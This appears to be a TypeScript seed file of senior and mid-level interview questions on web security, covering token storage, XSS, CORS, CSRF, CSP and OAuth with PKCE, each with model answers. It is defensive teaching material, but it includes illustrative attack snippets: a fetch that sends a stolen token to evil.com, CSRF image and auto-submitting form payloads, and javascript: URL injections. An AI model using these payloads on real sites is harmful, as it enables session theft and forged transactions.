// ============================================================================
// SECURITY & AUTHENTICATION
// ============================================================================

import { CreateQuestionInput, QUESTION_CATEGORIES } from "@/types";

export const securityAuthQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "senior",
    question:
      "Compare localStorage vs HttpOnly cookies for storing authentication tokens. What are the security implications of each approach?",
    answer: `## Security Comparison

| Aspect | localStorage | HttpOnly Cookie |
|--------|-------------|-----------------|
| XSS Vulnerability | **HIGH** - JS can read | **LOW** - JS cannot access |
| CSRF Vulnerability | **LOW** - Not auto-sent | **HIGH** - Auto-sent |
| Subdomains | Same origin only | Configurable |

## XSS Attack Vector

\`\`\`typescript
// localStorage - vulnerable to XSS
const stolenToken = localStorage.getItem('authToken');
fetch('https://evil.com/steal', { body: stolenToken });

// HttpOnly cookie - protected from XSS
document.cookie; // HttpOnly cookies not visible
\`\`\`

## CSRF Attack Vector

\`\`\`html
<!-- HttpOnly cookie - vulnerable to CSRF -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
\`\`\`

## Best Practice: Hybrid Approach

\`\`\`typescript
// Server
res.cookie('refreshToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/api/auth/refresh',
});

// Client - store access token in memory
class AuthManager {
  private accessToken: string | null = null;
  
  async fetch(url: string, options: RequestInit = {}) {
    return fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        ...options.headers,
        'Authorization': \`Bearer \${this.accessToken}\`,
      },
    });
  }
}
\`\`\`

**Recommendation:**
- Access Token: Memory (15 min expiry)
- Refresh Token: HttpOnly cookie
- Add CSRF tokens for cookie-based requests`,
    keyPoints: [
      "Understands XSS vs CSRF attack vectors",
      "Knows HttpOnly prevents JavaScript access",
      "Recommends hybrid approach",
      "Implements CSRF protection",
    ],
    followUpQuestions: [
      "How would you handle token refresh in a SPA?",
      "What about subdomain cookie sharing?",
    ],
    relatedTopics: ["xss", "csrf", "jwt", "session-management"],
    source: "seed",
    commonAt: ["Any company handling auth"],
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "mid",
    question:
      "What is XSS (Cross-Site Scripting)? Explain the different types and how to prevent them in a React application.",
    answer: `## XSS Types

### 1. Stored XSS
Script stored in database, served to all users.

### 2. Reflected XSS
Script reflected from URL parameters.

### 3. DOM-based XSS
Client-side JS manipulates DOM unsafely.

## React's Built-in Protection

\`\`\`tsx
// ✅ Safe - React escapes this
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
}
// "<script>alert('xss')</script>" → displayed as text
\`\`\`

## React XSS Vulnerabilities

### dangerouslySetInnerHTML

\`\`\`tsx
// ❌ Dangerous
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ Safe - sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userInput) 
}} />
\`\`\`

### javascript: URLs

\`\`\`tsx
// ❌ Vulnerable
<a href={userUrl}>Link</a>
// Attacker: javascript:alert('XSS')

// ✅ Safe - validate protocol
const safeUrl = url.startsWith('http') ? url : '#';
\`\`\`

## Prevention Checklist
- Use React's default escaping
- Sanitize HTML with DOMPurify
- Validate URLs (block javascript:)
- Implement Content Security Policy`,
    keyPoints: [
      "Can explain stored, reflected, DOM-based XSS",
      "Understands React's automatic escaping",
      "Knows dangerous patterns",
      "Implements sanitization",
    ],
    followUpQuestions: [
      "How does CSP help prevent XSS?",
      "What about XSS in SSR contexts?",
    ],
    relatedTopics: ["security", "csp", "sanitization"],
    source: "seed",
    commonAt: ["Any security-conscious company"],
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "mid",
    question:
      "What is CORS? Why does it exist, how does the preflight mechanism work, and why doesn't disabling it 'fix' anything?",
    answer: `## The baseline: Same-Origin Policy

Browsers block scripts on origin A from **reading** responses from origin B (origin = scheme + host + port). This stops a malicious page from using *your logged-in cookies* to read your bank's API. CORS is the server's controlled way to **relax** this — it protects users, not servers.

## Simple vs preflighted requests

- **Simple requests** (GET/POST with basic headers, form content types) are **sent**; the browser then checks \`Access-Control-Allow-Origin\` on the response before letting JS read it.
- Anything else — \`Content-Type: application/json\`, custom headers like \`Authorization\`, methods like PUT/DELETE — triggers a **preflight**: the browser sends \`OPTIONS\` with \`Access-Control-Request-Method/Headers\`, and only sends the real request if the server answers with matching \`Access-Control-Allow-*\` headers. \`Access-Control-Max-Age\` caches the preflight verdict.

## Credentials

Cross-origin requests only include cookies with \`credentials: "include"\`, and then the server must send \`Access-Control-Allow-Credentials: true\` **and a specific origin** — the wildcard \`*\` is forbidden with credentials, which is why "just allow *" breaks authenticated APIs.

## Interview traps

- CORS is **browser-enforced read protection** — curl/Postman/servers ignore it entirely; it is not access control for your API.
- The request often **reaches the server** even when CORS "fails" — the browser just refuses to expose the response.
- Right fixes: configure allowed origins server-side, or proxy through your own origin in dev. "Disable CORS" browser extensions just hide the problem locally.`,
    keyPoints: [
      "Same-Origin Policy blocks cross-origin reads; CORS selectively relaxes it",
      "Non-simple requests trigger an OPTIONS preflight checked before sending",
      "Credentialed requests need explicit origin + Allow-Credentials, never *",
      "CORS protects users in browsers — it is not server-side access control",
    ],
    followUpQuestions: [
      "Why are form POSTs 'simple' — and what attack does that enable?",
      "What do Access-Control-Expose-Headers and Max-Age control?",
    ],
    relatedTopics: ["same-origin-policy", "csrf", "http-headers"],
    source: "seed",
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "mid",
    question:
      "Explain CSRF: how the attack works, and the modern layered defense (SameSite cookies, tokens, origin checks).",
    answer: `## The attack

Browsers historically attached cookies to **every** request to a site — including requests initiated by *other* sites. So \`evil.com\` hosts:

\`\`\`html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
</form><script>document.forms[0].submit()</script>
\`\`\`

The victim's bank session cookie rides along; the bank sees an authenticated transfer. The attacker never reads the response (SOP blocks that) — they only need the **side effect**. That's CSRF: exploiting ambient credentials to perform state-changing actions.

## Layered defenses

1. **SameSite cookies** — \`SameSite=Lax\` (the modern default) omits cookies on cross-site POSTs/iframes/fetches; \`Strict\` also on top-level link navigation. This alone kills the classic attack, but don't rely on it exclusively (old browsers, \`None\` cookies for legit cross-site needs, subtle bypasses).
2. **CSRF tokens** — server issues a random token tied to the session, embedded in the page; state-changing requests must echo it (hidden field or header). Attackers can't read it cross-origin, so they can't forge it. The double-submit-cookie variant avoids server-side storage.
3. **Origin/Referer validation** — reject state-changing requests whose \`Origin\` header isn't your site. Cheap and effective backstop.
4. **Design hygiene** — GET must never mutate state; that's what makes \`<img src>\` CSRF possible.

Token-in-header APIs (Authorization: Bearer) are inherently CSRF-immune — the browser doesn't attach them automatically — which is a real point in their favor vs cookies.`,
    keyPoints: [
      "CSRF rides automatic cookie attachment to forge state-changing requests",
      "Attacker needs only the side effect, never the response",
      "Defense in depth: SameSite=Lax/Strict + CSRF token + Origin check",
      "GET must never mutate; header-based auth is CSRF-immune by default",
    ],
    followUpQuestions: [
      "What does SameSite=Lax still allow through, and why?",
      "How does the double-submit cookie pattern work without server state?",
    ],
    relatedTopics: ["cookies", "same-origin-policy", "session-management"],
    source: "seed",
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "senior",
    question:
      "Design a Content Security Policy for a production app. Which directives matter, and what makes a policy actually effective against XSS?",
    answer: `## What CSP does

A response header telling the browser **which sources of code and content are allowed to run/load**. It's the defense-in-depth layer for XSS: even if an injection lands in the DOM, the payload can't execute or exfiltrate.

## An effective modern policy

\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  connect-src 'self' https://api.example.com;
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
  report-uri /csp-reports
\`\`\`

The parts that matter:

- **Nonce + strict-dynamic** — only scripts carrying the per-response nonce run; scripts *they* create are trusted transitively. This replaces brittle allowlists of CDN domains, which are widely bypassable via JSONP/AngularJS gadgets hosted on allowed domains (the classic CSP bypass research).
- **No 'unsafe-inline' / 'unsafe-eval' for scripts** — allowing them makes the policy decorative; injected inline handlers are exactly what XSS uses.
- **object-src 'none', base-uri 'none'** — close Flash-era and \`<base>\`-hijack vectors.
- **frame-ancestors** — clickjacking protection (supersedes \`X-Frame-Options\`).
- **connect-src** — limits where injected code could exfiltrate data.

## Rollout reality

Ship as \`Content-Security-Policy-Report-Only\` first, watch reports, fix violations (the pain is always inline scripts/styles from legacy code and third-party tags), then enforce. Frameworks: Next.js supports per-request nonces via middleware; hashed sources (\`'sha256-…'\`) cover static inline snippets.`,
    keyPoints: [
      "CSP restricts executable sources — the safety net when XSS lands",
      "Nonce + strict-dynamic beats domain allowlists (JSONP/gadget bypasses)",
      "unsafe-inline for scripts nullifies the policy",
      "frame-ancestors, object-src none, base-uri none close side doors",
      "Deploy Report-Only first, then enforce",
    ],
    followUpQuestions: [
      "How do you handle third-party tags (analytics, ads) under strict CSP?",
      "What are Trusted Types and how do they complement CSP?",
    ],
    relatedTopics: ["xss", "http-headers", "clickjacking", "trusted-types"],
    source: "seed",
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "senior",
    question:
      "How does OAuth 2.0 Authorization Code flow with PKCE work for SPAs, and why is the BFF pattern increasingly preferred?",
    answer: `## The flow (Authorization Code + PKCE)

1. SPA generates a random \`code_verifier\`, derives \`code_challenge = SHA256(verifier)\`, and redirects to the authorization server with the challenge + state.
2. User authenticates there (your app never sees the password); server redirects back with a one-time **authorization code**.
3. SPA exchanges code + \`code_verifier\` at the token endpoint for tokens. The server re-hashes the verifier and compares — an attacker who intercepted the code **can't redeem it** without the verifier. That's what PKCE adds; it replaced the deprecated implicit flow (tokens in URL fragments leaked via history/referrer).
4. \`state\` parameter prevents CSRF on the callback; ID token (OIDC) carries identity claims, access token calls APIs, refresh tokens for SPAs should be **rotating with reuse detection**.

## The storage problem

Wherever the SPA keeps tokens, XSS can reach: localStorage is trivially readable; in-memory only mitigates persistence, not theft. This is the structural weakness of tokens-in-browser.

## BFF (Backend-for-Frontend)

Move OAuth entirely server-side: a thin backend does the code exchange, keeps tokens server-side, and gives the browser only an **HttpOnly, Secure, SameSite session cookie**, proxying API calls. Consequences:

- Tokens are XSS-unreachable (biggest win); logout/revocation are server-controlled.
- Cost: you now operate a stateful-ish backend and must handle CSRF (SameSite + tokens) — the classic cookie tradeoffs, which are well-understood.

Current OAuth-for-browser-apps guidance (IETF BCP) effectively says: use Code+PKCE, and prefer BFF when you can. Interview-worthy nuance: this is a *risk tradeoff* — BFF trades token theft risk for infrastructure complexity.`,
    keyPoints: [
      "Code + PKCE: challenge/verifier pair makes intercepted codes useless",
      "Implicit flow is dead — tokens don't belong in URLs",
      "state prevents callback CSRF; rotate refresh tokens with reuse detection",
      "Any browser-held token is XSS-reachable — the structural problem",
      "BFF keeps tokens server-side behind an HttpOnly session cookie",
    ],
    followUpQuestions: [
      "What is refresh token rotation and reuse detection?",
      "How does OIDC differ from plain OAuth 2.0?",
    ],
    relatedTopics: ["jwt", "cookies", "xss", "session-management"],
    source: "seed",
  },
];
